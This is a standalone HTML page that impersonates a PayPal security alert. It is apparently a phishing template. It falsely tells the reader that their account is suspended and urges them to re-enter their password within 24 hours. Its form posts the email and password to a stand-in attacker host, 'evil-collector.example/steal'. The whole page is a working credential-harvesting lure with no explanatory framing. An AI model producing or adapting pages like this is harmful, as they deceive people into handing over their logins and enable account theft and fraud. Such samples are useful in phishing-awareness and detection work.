<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>PayPal - Security alert</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 480px; margin: 4em auto; padding: 2em; border: 1px solid #ddd; border-radius: 8px; }
    h1 { color: #003087; }
    input { display: block; width: 100%; padding: 0.6em; margin: 0.5em 0; box-sizing: border-box; }
    button { background: #0070ba; color: white; border: 0; padding: 0.7em 1.5em; border-radius: 999px; cursor: pointer; }
    .warn { background: #fde2e2; color: #7f1d1d; padding: 1em; border-radius: 6px; margin: 1em 0; }
  </style>
</head>
<body>
  <h1>PayPal - Security alert</h1>
  <div class="warn">
    <strong>Your account is suspended due to unusual sign-in activity from a
    new device.</strong> Please verify your account and re-enter your password
    within 24 hours to avoid losing access. Click the button below to confirm
    your identity.
  </div>
  <form action="https://evil-collector.example/steal" method="post">
    <label>Email <input type="email" name="email" required></label>
    <label>Password <input type="password" name="password" required></label>
    <button type="submit">Verify identity</button>
  </form>
</body>
</html>
